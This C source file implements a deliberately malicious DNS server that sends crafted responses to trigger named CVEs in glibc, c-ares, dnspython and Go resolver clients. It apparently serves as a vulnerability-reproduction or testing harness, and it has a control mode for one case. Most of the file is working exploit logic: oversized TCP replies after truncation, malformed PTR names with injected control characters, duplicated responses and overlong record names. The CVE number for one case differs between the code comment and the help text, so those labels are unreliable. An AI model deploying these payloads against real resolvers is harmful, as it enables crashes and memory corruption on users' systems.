
////////////////////
// Build Options

#define BUILD_TITLE "BORKED_DNS_SERVER"
#define BUILD_CONSOLE_INTERFACE 1

//////////////
// Includes

#include "base/base_inc.h"
#include "net/net_inc.h"
#include "dns/dns_inc.h"

#include "base/base_inc.c"
#include "net/net_inc.c"
#include "dns/dns_inc.c"

read_only u16 LISTENING_PORT = 53;
#define TEST_IPV4_ADDR 0x0b16212c

internal void bdns_test(void)
{
    Temp scratch = scratch_begin(0, 0);
    
    DNS_Server server = dns_server_alloc(NET_AddressFamily_IPv4, DNS_TransportProtocol_UDP, LISTENING_PORT);
    NET_Client client = net_listener_accept(scratch.arena, server.listener);
    DNS_Msg query = {0};
    if (dns_unpack_msg(scratch.arena, client.recv_buffer, &query))
    {
        DNS_Msg msg = query; // shallow copy

        msg.header.query_response = true;
        msg.header.authoritative  = true;
        msg.header.rcode          = DNS_RCode_NoError;

        msg.header.answer_count = 1;
        msg.answer = push_array(scratch.arena, DNS_RR, 1);

        msg.answer[0].name  = query.question[0].name;
        msg.answer[0].type  = query.question[0].type;
        msg.answer[0].class = query.question[0].class;
        msg.answer[0].ttl   = 5;

        msg.answer[0].rdata.A.addr = TEST_IPV4_ADDR;

        dns_pack_msg(client.send_buffer, &msg);
        net_client_send_from_ring(&client);
    }
    
    scratch_end(scratch);
}

internal void bdns_g01(bool32 no_vuln)
{
    // glibc
    // CVE-2023-4527
    /* we must send UDP response with the TC (truncated) flag set.
     * when the client retries over TCP, send a response larger than 2048 bytes. */
    
    /* GLIBC CLIENT PROGRAM CURRENTLY CANT HANDLE TCP RESPONSES ABOVE 1024 BYTES EVEN IN THE CONTROL CASE? */
    printf("g01 : 127.0.0.1:%hu\n", LISTENING_PORT);
    Temp scratch = scratch_begin(0, 0);

    DNS_Server udp_server = dns_server_alloc(NET_AddressFamily_IPv4, DNS_TransportProtocol_UDP, LISTENING_PORT);
    DNS_Server tcp_server = dns_server_alloc(NET_AddressFamily_IPv4, DNS_TransportProtocol_TCP, LISTENING_PORT);
    DNS_Msg query = {0};
    
    NET_Client udp_client = net_listener_accept(scratch.arena, udp_server.listener);
    printf("Accepted UDP client\n");
    if (dns_unpack_msg(scratch.arena, udp_client.recv_buffer, &query))
    {
        DNS_Msg msg = query;
        
        msg.header.query_response = true;
        msg.header.authoritative  = true;
        msg.header.truncated      = true;
        msg.header.rcode          = DNS_RCode_NoError;
        
        msg.header.answer_count = 0;
        
        dns_pack_msg(udp_client.send_buffer, &msg);
        if (net_client_send_from_ring(&udp_client))
        {
            printf("Sent UDP response with truncated DNS flag\n");
        }
        else
        {
            printf("Failed to send UDP response...\n");
        }
    }
    NET_Client tcp_client = net_listener_accept(scratch.arena, tcp_server.listener);
    printf("Accepted TCP client\n");
    if (net_client_recv_to_ring(&tcp_client))
    {
        printf("Received TCP data\n");
    }
    else
    {
        printf("Failed to receive TCP data\n");
    }
    u16 length = 0;
    ring_try_read_struct(tcp_client.recv_buffer, &length);
    if (dns_unpack_msg(scratch.arena, tcp_client.recv_buffer, &query))
    {
        DNS_Msg msg = query;

        msg.header.query_response = true;
        msg.header.authoritative  = true;
        msg.header.rcode          = DNS_RCode_NoError;

        if (no_vuln)
        {
            msg.header.answer_count = 1;
            msg.answer = push_array(scratch.arena, DNS_RR, 1);
            
            msg.answer[0].name = query.question[0].name;
            msg.answer[0].type = query.question[0].type;
            msg.answer[0].class = query.question[0].class;
            msg.answer[0].ttl = 5;
            
            msg.answer[0].rdata.A.addr = TEST_IPV4_ADDR;
            
            u64 length64 = dns_msg_wire_length(&msg);
            u16 length16 = host_to_net_u16(safe_cast_u16(safe_cast_u32(length64)));
            ring_try_write_struct(tcp_client.send_buffer, &length16);
            if (dns_pack_msg(tcp_client.send_buffer, &msg)) {printf("Packed MSG to wire.\n");}
            else {printf("Failed to pack msg to wire...\n");}
            if (net_client_send_from_ring(&tcp_client)) {printf("Sent TCP response.\n");}
            else {printf("Failed to send TCP response...\n");}
        }
        else
        {
            DNS_RR rr = {0};
            rr.name = query.question[0].name;
            rr.type = query.question[0].type;
            rr.class = query.question[0].class;
            rr.ttl = 300;
            rr.rdata.A.addr = TEST_IPV4_ADDR;
            
            u64 rr_size = dns_rr_wire_length(&rr);
            // we want to send enough entries that are LARGER than 2048 bytes on the wire.
            // Lets go with 4096 :)
            msg.header.answer_count = Kilobytes(4) / rr_size;
            msg.answer = push_array(scratch.arena, DNS_RR, msg.header.answer_count);

            for (u64 idx = 0; idx < msg.header.answer_count; idx++)
            {
                msg.answer[idx].name = query.question[0].name;
                msg.answer[idx].type = query.question[0].type;
                msg.answer[idx].class = query.question[0].class;
                msg.answer[idx].ttl = 300;

                msg.answer[idx].rdata.A.addr = TEST_IPV4_ADDR + idx;
            }

            u64 length64 = dns_msg_wire_length(&msg);
            u16 length16 = host_to_net_u16(safe_cast_u16(safe_cast_u32(length64)));
            ring_try_write_struct(tcp_client.send_buffer, &length16);
            if (dns_pack_msg(tcp_client.send_buffer, &msg)) {printf("Packed MSG to wire.\n");}
            else {printf("Failed to pack msg to wire...\n");}
            u64 num_bytes = ring_peek_unread_quantity(tcp_client.send_buffer);
            if (net_client_send_from_ring(&tcp_client)) {printf("Sent TCP response of %llu bytes.\n", num_bytes);}
            else {printf("Failed to send TCP response...\n");}
        }
    }

    scratch_end(scratch);
}

internal void bdns_g02(bool32 no_vuln)
{
    // glibc
    // CVE-2026-4437
    printf("g02 : 127.0.0.1:%hu\n", LISTENING_PORT);
    Temp scratch = scratch_begin(0, 0);

    DNS_Server server = dns_server_alloc(NET_AddressFamily_IPv4, DNS_TransportProtocol_UDP, LISTENING_PORT);
    DNS_Msg query = {0};
    NET_Client client = net_listener_accept(scratch.arena, server.listener);
    printf("Accepted UDP client\n");
    if (dns_unpack_msg(scratch.arena, client.recv_buffer, &query))
    {
        DNS_Msg msg = query;

        msg.header.query_response = true;
        msg.header.authoritative  = true;
        msg.header.rcode          = DNS_RCode_NoError;

        msg.header.answer_count = 1;
        msg.header.nameserver_count = 1;

        msg.answer = push_array(scratch.arena, DNS_RR, 1);
        msg.ns     = push_array(scratch.arena, DNS_RR, 1);

        msg.answer[0].name  = query.question[0].name;
        msg.answer[0].type  = DNS_Type_A;
        msg.answer[0].class = query.question[0].class;
        msg.answer[0].ttl   = 300;
        msg.answer[0].rdata.A.addr = TEST_IPV4_ADDR;

        msg.ns[0].name  = query.question[0].name;
        msg.ns[0].type  = query.question[0].type;
        msg.ns[0].class = query.question[0].class;
        msg.ns[0].ttl   = 300;
        msg.ns[0].rdata.PTR.ptrdname = s("super.evil.domain.");

        dns_pack_msg(client.send_buffer, &msg);
        net_client_send_from_ring(&client);
    }

    scratch_end(scratch);
}

internal void bdns_g03(bool32 no_vuln)
{
    // glibc
    // CVE-2026-4438
    printf("g03 : 127.0.0.1:%hu\n", LISTENING_PORT);
    Temp scratch = scratch_begin(0, 0);

    DNS_Server server = dns_server_alloc(NET_AddressFamily_IPv4, DNS_TransportProtocol_UDP, LISTENING_PORT);
    DNS_Msg query = {0};
    NET_Client client = net_listener_accept(scratch.arena, server.listener);
    printf("Accepted UDP client\n");
    if (dns_unpack_msg(scratch.arena, client.recv_buffer, &query))
    {
        DNS_Msg msg = query;

        msg.header.query_response = true;
        msg.header.authoritative  = true;
        msg.header.rcode          = DNS_RCode_NoError;

        msg.header.answer_count = 1;

        msg.answer = push_array(scratch.arena, DNS_RR, 1);

        msg.answer[0].name  = query.question[0].name;
        msg.answer[0].type  = query.question[0].type;
        msg.answer[0].class = query.question[0].class;
        msg.answer[0].ttl   = 300;
        msg.answer[0].rdata.PTR.ptrdname = s("$uper.evi;.\t\n\tdomain.");

        dns_pack_msg(client.send_buffer, &msg);
        net_client_send_from_ring(&client);
    }

    scratch_end(scratch);
}

internal void bdns_c01(bool32 no_vuln)
{
    // c-ares
    // CVE-2026-33630
    printf("c01 : 127.0.0.1:%hu\n", LISTENING_PORT);
    Temp scratch = scratch_begin(0, 0);

    DNS_Server udp_server = dns_server_alloc(NET_AddressFamily_IPv4, DNS_TransportProtocol_UDP, LISTENING_PORT);
    DNS_Server tcp_server = dns_server_alloc(NET_AddressFamily_IPv4, DNS_TransportProtocol_TCP, LISTENING_PORT);
    DNS_Msg query = {0};

    /*
    NET_Client udp_client = net_listener_accept(scratch.arena, udp_server.listener);
    printf("Accepted UDP client\n");
    if (dns_unpack_msg(scratch.arena, udp_client.recv_buffer, &query))
    {
        DNS_Msg msg = query;

        msg.header.query_response = true;
        msg.header.authoritative  = true;
        msg.header.truncated      = true;
        msg.header.rcode          = DNS_RCode_NoError;

        msg.header.answer_count = 0;

        dns_pack_msg(udp_client.send_buffer, &msg);
        if (net_client_send_from_ring(&udp_client))
        {
            printf("Sent UDP response with truncated DNS flag\n");
        }
        else
        {
            printf("Failed to send UDP response...\n");
        }
    }
    */
    NET_Client tcp_client = net_listener_accept(scratch.arena, tcp_server.listener);
    printf("Accepted TCP client\n");
    if (net_client_recv_to_ring(&tcp_client))
    {
        printf("Received TCP data\n");
    }
    else
    {
        printf("Failed to receive TCP data\n");
    }
    u16 length = 0;
    ring_try_read_struct(tcp_client.recv_buffer, &length);
    if (dns_unpack_msg(scratch.arena, tcp_client.recv_buffer, &query))
    {
        DNS_Msg msg = query;

        msg.header.query_response = true;
        msg.header.authoritative  = true;
        msg.header.rcode          = DNS_RCode_FormErr;
        msg.header.answer_count = 0;

        dns_pack_msg(tcp_client.send_buffer, &msg);
        Ring *ring = make_ring(scratch.arena, Kilobytes(64));
        msg = query;

        msg.header.query_response = true;
        msg.header.authoritative  = true;
        msg.header.rcode          = DNS_RCode_NoError;
        msg.header.answer_count = 1;
        
        msg.answer = push_array(scratch.arena, DNS_RR, 1);
        msg.answer[0].name = query.question[0].name;
        msg.answer[0].type = query.question[0].type;
        msg.answer[0].class = query.question[0].class;
        msg.answer[0].ttl = 300;
        if (msg.answer[0].type == DNS_Type_A)
        {
            msg.answer[0].rdata.A.addr = TEST_IPV4_ADDR;
        }
        else
        {
            msg.answer[0].rdata.PTR.ptrdname = s("example.domain.");
        }
        dns_pack_msg(ring, &msg);

        net_client_send_from_ring(&tcp_client);
        tcp_client.send_buffer = ring;
        net_client_send_from_ring(&tcp_client);
        net_client_close(tcp_client);
        printf("Sent data!\n");
    }
    
    scratch_end(scratch);
}

internal void bdns_c02(bool32 no_vuln)
{
    // c-ares
    // CVE-2025-62408
    printf("c02 : 127.0.0.1:%hu\n", LISTENING_PORT);
    Temp scratch = scratch_begin(0, 0);

    DNS_Server server = dns_server_alloc(NET_AddressFamily_IPv4, DNS_TransportProtocol_UDP, LISTENING_PORT);
    DNS_Msg query = {0};
    NET_Client client = net_listener_accept(scratch.arena, server.listener);
    printf("Accepted UDP client\n");
    if (dns_unpack_msg(scratch.arena, client.recv_buffer, &query))
    {
        DNS_Msg msg = query;

        msg.header.query_response = true;
        msg.header.authoritative  = true;
        msg.header.rcode          = DNS_RCode_NXDomain;

        dns_pack_msg(client.send_buffer, &msg);
        net_client_send_from_ring(&client);
        dns_server_shutdown_and_release(&server);
        net_client_close(client);
    }

    scratch_end(scratch);
}

internal void bdns_d01(bool32 no_vuln)
{
    // dnspython
    // CVE-2023-29483
    printf("d01 : 127.0.0.1:%hu\n", LISTENING_PORT);
    Temp scratch = scratch_begin(0, 0);

    DNS_Server server = dns_server_alloc(NET_AddressFamily_IPv4, DNS_TransportProtocol_UDP, LISTENING_PORT);
    NET_Client client = net_listener_accept(scratch.arena, server.listener);
    DNS_Msg query = {0};
    if (dns_unpack_msg(scratch.arena, client.recv_buffer, &query))
    {
        // bad message
        {
            net_client_send_from_ring(&client); // empty message
        }
        
        // good message
        {
            DNS_Msg msg = query; // shallow copy
            
            msg.header.query_response = true;
            msg.header.authoritative  = true;
            msg.header.rcode          = DNS_RCode_NoError;
            
            msg.header.answer_count = 1;
            msg.answer = push_array(scratch.arena, DNS_RR, 1);
            
            msg.answer[0].name  = query.question[0].name;
            msg.answer[0].type  = query.question[0].type;
            msg.answer[0].class = query.question[0].class;
            msg.answer[0].ttl   = 5;
            
            msg.answer[0].rdata.A.addr = TEST_IPV4_ADDR;
            
            dns_pack_msg(client.send_buffer, &msg);
            net_client_send_from_ring(&client);
        }
    }
    

    scratch_end(scratch);
}

internal void bdns_go1(bool32 no_vuln)
{
    // golang
    // CVE-2024-24788
    printf("go1 : 127.0.0.1:%hu\n", LISTENING_PORT);
    Temp scratch = scratch_begin(0, 0);

    DNS_Server server = dns_server_alloc(NET_AddressFamily_IPv4, DNS_TransportProtocol_UDP, LISTENING_PORT);
    DNS_Msg query = {0};
    NET_Client client = net_listener_accept(scratch.arena, server.listener);
    printf("Accepted UDP client\n");
    if (dns_unpack_msg(scratch.arena, client.recv_buffer, &query))
    {
        DNS_Msg msg = query;

        msg.header.query_response = true;
        msg.header.authoritative  = true;
        msg.header.rcode          = DNS_RCode_NoError;

        msg.header.additional_count = 1;

        msg.extra = push_array(scratch.arena, DNS_RR, msg.header.additional_count);

        msg.extra[0].name = s("superduperlongdomainname."
                                   "superduperlongdomainname."
                                   "superduperlongdomainname."
                                   "superduperlongdomainname."
                                   "superduperlongdomainname."
                                   "superduperlongdomainname."
                                   "superduperlongdomainname.");
        msg.extra[0].type = query.question[0].type;
        msg.extra[0].class = query.question[0].class;
        msg.extra[0].ttl = 300;
        msg.extra[0].rdata.A.addr = 0xFFFFFFFF;

        dns_pack_msg(client.send_buffer, &msg);
        net_client_send_from_ring(&client);
    }

    scratch_end(scratch);
}

internal void bdns_help(void)
{
    fprintf(stderr, "--- Help -------------------------------------------------------\n");
    fprintf(stderr, " %s\n\n", BUILD_TITLE_STRING_LITERAL);
    fprintf(stderr, " Usage: borked_dns_server [Options]\n\n");
    fprintf(stderr, " Options:\n");
    fprintf(stderr, "   -g01 : CVE-2023-4527\n");
    fprintf(stderr, "   -g02 : CVE-2026-4427\n");
    fprintf(stderr, "   -g03 : CVE-2026-4438\n");
    fprintf(stderr, "   -c01 : CVE-2026-33630\n");
    fprintf(stderr, "   -c02 : CVE-2025-62408\n");
    fprintf(stderr, "   -d01 : CVE-2023-29483\n");
    fprintf(stderr, "   -go1 : CVE-2024-24788\n");
}

internal void entry_point(Cmd_Line *cmdline)
{
    Temp scratch = scratch_begin(0, 0);
    u64 exit_code = max_u64;
    
    bool32 no_vuln = false;
    
    if (cmd_line_has_flag(cmdline, str8_lit("no_vuln"))) { no_vuln = true; }

    if      (cmd_line_has_flag(cmdline, str8_lit("test"))){ bdns_test(); }
    else if (cmd_line_has_flag(cmdline, str8_lit("g01"))) { bdns_g01(no_vuln); }
    else if (cmd_line_has_flag(cmdline, str8_lit("g02"))) { bdns_g02(no_vuln); }
    else if (cmd_line_has_flag(cmdline, str8_lit("g03"))) { bdns_g03(no_vuln); }
    else if (cmd_line_has_flag(cmdline, str8_lit("c01"))) { bdns_c01(no_vuln); }
    else if (cmd_line_has_flag(cmdline, str8_lit("c02"))) { bdns_c02(no_vuln); }
    else if (cmd_line_has_flag(cmdline, str8_lit("d01"))) { bdns_d01(no_vuln); }
    else if (cmd_line_has_flag(cmdline, str8_lit("go1"))) { bdns_go1(no_vuln); }
    else                                                  { bdns_help(); }
    
    scratch_end(scratch);
    exit(exit_code);
}
